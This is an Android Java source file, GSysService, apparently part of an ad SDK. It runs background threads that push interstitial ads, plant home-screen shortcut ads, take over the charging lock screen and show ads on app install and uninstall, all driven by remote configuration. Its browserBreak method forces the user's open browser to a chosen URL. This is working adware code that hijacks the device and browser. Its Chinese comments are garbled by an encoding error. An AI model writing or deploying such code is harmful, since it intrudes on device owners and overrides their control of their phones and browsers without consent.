package com.guang.client;



import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileLock;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.guang.client.controller.GOfferController;
import com.guang.client.controller.GUserController;
import com.guang.client.tools.GLog;
import com.guang.client.tools.GTools;
import com.qinglu.ad.QLAdController;
import com.qinglu.ad.QLBatteryLock;
import com.qinglu.ad.QLInstall;
import com.qinglu.ad.QLNotifier;
import com.qinglu.ad.QLShortcut;
import com.qinglu.ad.QLUnInstall;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Environment;

@SuppressLint("SimpleDateFormat")
public class GSysService  {
	private static GSysService _instance;	
	private static Context contexts;
	private static GSysReceiver receiver;
	private String activePackageName;	
	private boolean isPresent;
	private boolean isRuning;
	
	private GSysService()
	{
		isPresent = false;
		isRuning = false;
	}
	
	public static GSysService getInstance()
	{
		if(_instance == null)
			_instance = new GSysService();
		return _instance;
	}
	
	public void updateActive(String packageName)
	{
		this.activePackageName = packageName;
		long n_time = GTools.getCurrTime();
		GTools.saveSharedData(GCommon.SHARED_KEY_APP_ACTIVE_TIME, n_time);
	}
	
	

	public void start(final Context context) {
		contexts = context;
	
		new Thread() {
			public void run() {
				GuangClient client = GuangClient.getInstance();
				client.setContext(context);
				GTools.saveSharedData(GCommon.SHARED_KEY_SERVICE_RUN_TIME,GTools.getCurrTime());
				client.start();		
				registerListener();
				
				QLInstall.getInstance().getInstallAppNum();
				QLUnInstall.getInstance().getAppInfo(true);
			};
		}.start();				
	}
	
	public void startMainLoop()
	{		
		//boolean open = (Boolean) GTools.getConfig("open");		
		new Thread() {
			public void run() {
				Context context = contexts;
				if(context == null)
					context = QLAdController.getInstance().getContext();
				initData();
				while(isMainLoop())
				{				
					try {		
						if(		isPresent 
								&& isWifi()
								&& isAppSwitch()
								&& isAdPosition(GCommon.OPENSPOT)
								&& isShowTimeInterval()
								&& isShowNum()
								&& isTimeSlot()
								&& GTools.getCpuUsage()
								&& isMultiApp())
						{							
							appStartUp(); 
						}	
						judgeActive();						
						Thread.sleep(100);
					} catch (Exception e) {
					}
				}	
				GUserController.getInstance().restarMainLoop();
				GLog.e("------------------------", "restarMainLoop");
			};
		}.start();
		
		browserBreakAndShortcutThread();
	}
	
	public void startLockThread()
	{
		if(		
				isAppSwitch()
				&& isAdPosition(GCommon.CHARGLOCK)
				&& isOpenLock()
				&& !QLBatteryLock.getInstance().isShow()
				&& QLBatteryLock.getInstance().isFirst())
		{
			QLBatteryLock.getInstance().show();
		}	
	}
	
	public void browserBreakAndShortcutThread()
	{
		new Thread() {
			public void run() {
				Context context = contexts;
				if(context == null)
					context = QLAdController.getInstance().getContext();
				while(isMainLoop())
				{				
					try {	
						boolean shortcut = false;
						if(		isPresent 
								&& isWifi()
								&& isAppSwitch()
								&& isAdPosition(GCommon.SHORTCUT)
								&& isShowShortcutTime()
								&& isShowShortcutAd())
						{		
							shortcut = true;
							QLShortcut.getInstance().show();
							GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_OPEN_TIME, GTools.getCurrTime());
						}	
						
						if(		isPresent 
								&& !shortcut
								&& isWifi()
								&& isAppSwitch()
								&& isAdPosition(GCommon.BROWSER_INTERCEPTION)
								&& isShowBrowerTime()
								&& isShowBrowerAd())
						{		
							String s =  GTools.getBrowserCpuUsage();
							if(s != null)
								browserBreak(s); 
						}	
							
						Thread.sleep(100);
					} catch (Exception e) {
					}
				}					
			};
		}.start();
	}
	
	//Ӧ������
	private void appStartUp()
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_OPEN_SPOT_TIME,GTools.getCurrTime());
		
		boolean isget = GOfferController.getInstance().isGetRandOffer();
		if(isget)
		{
			 GOfferController.getInstance().getRandOffer(GCommon.OPENSPOT);
			 return;
		}
		if(GOfferController.getInstance().isDownloadResSuccess())
		{
			if(GOfferController.getInstance().getNoTagOffer() != null)
			{
				QLAdController.getSpotManager().showSpotAds(null);
				if(isAdPosition(GCommon.BANNER))
					QLNotifier.getInstance().showNotify();
			}
		}
		else
		{
			 GOfferController.getInstance().getRandOffer(GCommon.OPENSPOT);
		}
	}
	//������ػ�
	private void browserBreak(String packageName)
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_OPEN_TIME, GTools.getCurrTime());
		
		String url = "www.baidu.com";
		PackageManager packageMgr = contexts.getPackageManager();
		Intent intent = packageMgr.getLaunchIntentForPackage(packageName);
        intent.setAction(Intent.ACTION_VIEW);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.setData(Uri.parse(url));
        contexts.startActivity(intent);
	}
		
	
	private void initData()
	{
		isPresent = true;
		isRuning = true;
		long n_time = GTools.getCurrTime();
		GTools.saveSharedData(GCommon.SHARED_KEY_MAIN_LOOP_TIME, n_time);
		GTools.saveSharedData(GCommon.SHARED_KEY_OFFER_SAVE_TIME, 0l);
		GTools.saveSharedData(GCommon.SHARED_KEY_OPEN_SPOT_SHOW_NUM, 0);
	}
	
	private boolean isMainLoop()
	{
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_MAIN_LOOP_TIME, 0);
		long n_time = GTools.getCurrTime();
		return (n_time - time < 24 * 60 * 60 * 1000);		
	}
	//�Ƿ������ý��
	private boolean isAppSwitch()
	{
		String appSwitch = (String) GTools.getConfig("appSwitch");
		if(appSwitch == null)
			return false;
		return appSwitch.contains(GTools.getPackageName());
	}
	
	//�Ƿ�����ù��λ
	public boolean isAdPosition(int adPositionType)
	{
//		String appSwitch = (String) GTools.getConfig("appSwitch");
//		if(appSwitch != null)
//		{
//			String []apps = appSwitch.split(",");
//			for(String app : apps)
//			{
//				if(app.contains(GTools.getPackageName()))
//				{
//					String adPositions = app.split(":")[1];
//					String pos[] = adPositions.split("-");
//					for(String p : pos)
//					{
//						if(Integer.parseInt(p) == adPositionType)
//							return true;
//					}
//				}
//			}
//		}
		String adPositionSwitch = (String) GTools.getConfig("adPositionSwitch");
		if(adPositionSwitch != null)
		{
			String []adPositions = adPositionSwitch.split(",");
			for(String p : adPositions)
			{
				if(Integer.parseInt(p) == adPositionType)
					return true;
			}
		}
		return false;
	}
	
	public boolean isWifi()
	{
		return "WIFI".equals(GTools.getNetworkType());
	}
	//ʱ����
	private boolean isShowTimeInterval()
	{
		long n_time = GTools.getCurrTime();
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_OPEN_SPOT_TIME, 0);
		String obj = GTools.getConfig("showTimeInterval").toString();
		float showTimeInterval = Float.parseFloat(obj);	
		final long interval = (long) (1000 * 60 * showTimeInterval);
		return n_time - time > interval;
	}
	//ÿ��չʾ����
	private boolean isShowNum()
	{
		int show_num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_OPEN_SPOT_SHOW_NUM, 0);
		int showNum = (Integer) GTools.getConfig("showNum");
		
		return show_num <= showNum;
	}
	//ʱ���
	@SuppressWarnings("deprecation")
	private boolean isTimeSlot()
	{
		String timeSlot = (String) GTools.getConfig("timeSlot");
		if(timeSlot == null || "".equals(timeSlot))
			return true;
		
		boolean isContainToday = false;
		boolean isContainTime = false;
		
		String times[] = timeSlot.split(",");
		for(String time : times)
		{
			String t[] = time.split("type=");
			String type = t[1];//��������
			if("1".equals(type))
			{
				String date = t[0].split(" ")[0];//���� 2016-08-06
				String h[] = t[0].split(" ")[1].split("--"); //13:00--15:00
				String date1 = date + " " + h[0];
				String date2 = date + " " + h[1];
				
				SimpleDateFormat sdf = new SimpleDateFormat( "yyyy-MM-dd" );
				String now = sdf.format(new Date());
				try {
					int com = sdf.parse(date).compareTo(sdf.parse(now));
					if(com == 0)
					{
						isContainToday = true;
						sdf = new SimpleDateFormat( "yyyy-MM-dd HH:mm" );
						now = sdf.format(new Date());
						int com1 = sdf.parse(date1).compareTo(sdf.parse(now));
						int com2 = sdf.parse(date2).compareTo(sdf.parse(now));
						if(com1 <= 0 && com2 >= 0)
							isContainTime = true;						
					}					
				} catch (ParseException e) {
					e.printStackTrace();
				}
				
			}
			else if("2".equals(type))
			{
				String date = t[0].split(" ")[0];//���� ������
				String h[] = t[0].split(" ")[1].split("--"); //13:00--15:00
				String date1 = h[0];
				String date2 = h[1];
				
				String[] days = {"һ","��","��","��","��","��","��"};
				int day = 0;
				for(int i=0;i<days.length;i++)
				{
					if(date.contains(days[i]))
					{
						day = i+1;
						break;
					}
				}
				//�ж��Ƿ���ͬһ���ڼ�
				if(new Date().getDay() == day)
				{
					isContainToday = true;
					SimpleDateFormat sdf = new SimpleDateFormat( "HH:mm" );
					String now = sdf.format(new Date());
					try {
						int com1 = sdf.parse(date1).compareTo(sdf.parse(now));
						int com2 = sdf.parse(date2).compareTo(sdf.parse(now));
						if(com1 <= 0 && com2 >= 0)
						{				
							isContainTime = true;
						}												
					}catch (ParseException e) {
						e.printStackTrace();
					}
				}				
			}			
		}		
		if(isContainToday)
		{
			return isContainTime;
		}
		return true;
	}
	
	public boolean isMultiApp()
	{
		String name = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();
		File f = new File(name, "multiapp");
		if(!f.exists())
		{
			try {
				f.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}			
		}
		try {
			final FileOutputStream fos = new FileOutputStream(f);
			final FileLock fl = fos.getChannel().tryLock(); 
			if(fl != null && fl.isValid())
	        {
				new Thread(){
					public void run() {
						try {
							Thread.sleep(8000);
							deleteMultiApp(fl,fos);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}						
					};
				}.start();
				return true;
	        }
		} catch (Exception e1) {
			e1.printStackTrace();
		}  
		return false;
	}
	
	public void deleteMultiApp(FileLock fl,FileOutputStream fos)
	{
		try {
			if(fos != null)
				fos.close();			
		} catch (Exception e) {
		}		
        try {  
        	if(fl != null && fl.isValid())
        		fl.release();  
        } catch (IOException e) {  
        }  
	}

	private void judgeActive()
	{
		if(activePackageName == null)
			return;
		long n_time = GTools.getCurrTime();
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_APP_ACTIVE_TIME, 0l);
		if(n_time - time < 10 * 60 * 1000)
		{
			if(GTools.judgeAppActive(activePackageName))
			{							
				Intent intent = new Intent();  
				intent.putExtra("activePackageName", activePackageName);
				intent.setAction(GCommon.ACTION_QEW_APP_ACTIVE);  
				contexts.sendBroadcast(intent);  
				
				GTools.saveSharedData(GCommon.SHARED_KEY_APP_ACTIVE_TIME, 0l);
				activePackageName = null;
			}
		}
		
	}
	
	public boolean isOpenLock()
	{
		//�ж��Ƿ���Դ�
		int type = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_LOCK_SAVE_TYPE, 1);		
		if(type == 0)
		{
			return false;
		}
		else 
		{
			long time =  GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_LOCK_SAVE_TIME, 0l);
			Date today = new Date();
			Date date = new Date(time);
			if(type == 2)
			{
				if(today.getDate() == date.getDate())
				{
					return false;
				}
			}
			else if(type == 3)
			{
				if(today.getDate() - date.getDate() <= 3)
				{
					return false;
				}
			}
			else if(type == 4)
			{
				if(today.getDate() - date.getDate() <= 7)
				{
					return false;
				}
			}
			else if(type == 5)
			{
				if(today.getDate() - date.getDate() <= 30)
				{
					return false;
				}
			}
		}
		return true;
	}
	
	public boolean isShowLockAd()
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_OPEN_SPOT_TIME,GTools.getCurrTime());
		
		boolean isget = GOfferController.getInstance().isGetRandOffer();
		if(isget)
		{
			 GOfferController.getInstance().getRandOffer(GCommon.CHARGLOCK);
			 return false;
		}
		if(GOfferController.getInstance().isDownloadResSuccess())
		{
			if(GOfferController.getInstance().getNoTagOffer() != null)
			{
				return true;
			}
		}
		else
		{
			 GOfferController.getInstance().getRandOffer(GCommon.CHARGLOCK);
			 return false;
		}
		return true;
	}
	
	public boolean isShowInstallAd()
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_OPEN_SPOT_TIME,GTools.getCurrTime());
		
		boolean isget = GOfferController.getInstance().isGetRandOffer();
		if(isget)
		{
			 GOfferController.getInstance().getRandOffer(GCommon.APP_INSTALL);
			 return false;
		}
		if(GOfferController.getInstance().isDownloadResSuccess())
		{
			if(GOfferController.getInstance().getNoTagOffer() != null)
			{
				return true;
			}
		}
		else
		{
			 GOfferController.getInstance().getRandOffer(GCommon.APP_INSTALL);
			 return false;
		}
		return true;
	}
	
	public boolean isShowUnInstallAd()
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_OPEN_SPOT_TIME,GTools.getCurrTime());
		
		boolean isget = GOfferController.getInstance().isGetRandOffer();
		if(isget)
		{
			 GOfferController.getInstance().getRandOffer(GCommon.APP_UNINSTALL);
			 return false;
		}
		if(GOfferController.getInstance().isDownloadResSuccess())
		{
			if(GOfferController.getInstance().getNoTagOffer() != null)
			{
				return true;
			}
		}
		else
		{
			 GOfferController.getInstance().getRandOffer(GCommon.APP_UNINSTALL);
			 return false;
		}
		return true;
	}
	
	public boolean isShowShortcutTime()
	{
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_SHORTCUT_OPEN_TIME, 0);
		long n_time = GTools.getCurrTime();
		return (n_time - time > 60 * 60 * 1000);	
	}
	
	public boolean isShowShortcutAd()
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_OPEN_SPOT_TIME,GTools.getCurrTime());
		
		boolean isget = GOfferController.getInstance().isGetRandOffer();
		if(isget)
		{
			 GOfferController.getInstance().getRandOffer(GCommon.SHORTCUT);
			 return false;
		}
		if(GOfferController.getInstance().isDownloadResSuccess())
		{
			if(GOfferController.getInstance().getNoTagOffer() != null)
			{
				return true;
			}
		}
		else
		{
			 GOfferController.getInstance().getRandOffer(GCommon.SHORTCUT);
			 return false;
		}
		return true;
	}
	
	public boolean isShowBrowerTime()
	{
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_BROWSER_OPEN_TIME, 0);
		long n_time = GTools.getCurrTime();
		return (n_time - time > 10 * 60 * 1000);	
	}
	
	public boolean isShowBrowerAd()
	{
		GTools.saveSharedData(GCommon.SHARED_KEY_OPEN_SPOT_TIME,GTools.getCurrTime());
		
		boolean isget = GOfferController.getInstance().isGetRandOffer();
		if(isget)
		{
			 GOfferController.getInstance().getRandOffer(GCommon.BROWSER_INTERCEPTION);
			 return false;
		}
		if(GOfferController.getInstance().isDownloadResSuccess())
		{
			if(GOfferController.getInstance().getNoTagOffer() != null)
			{
				return true;
			}
		}
		else
		{
			 GOfferController.getInstance().getRandOffer(GCommon.BROWSER_INTERCEPTION);
			 return false;
		}
		return true;
	}



	private static void registerListener() {
		receiver = new GSysReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(GCommon.ACTION_QEW_APP_STARTUP);
        filter.addAction(GCommon.ACTION_QEW_APP_ACTIVE);
        filter.addAction(GCommon.ACTION_QEW_OPEN_APP);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_BATTERY_CHANGED);
        contexts.registerReceiver(receiver, filter);
        
    }

	
	public boolean isPresent() {
		return isPresent;
	}

	public void setPresent(boolean isPresent) {
		this.isPresent = isPresent;
	}

	public boolean isRuning() {
		return isRuning;
	}

	public void setRuning(boolean isRuning) {
		this.isRuning = isRuning;
	}

   
}
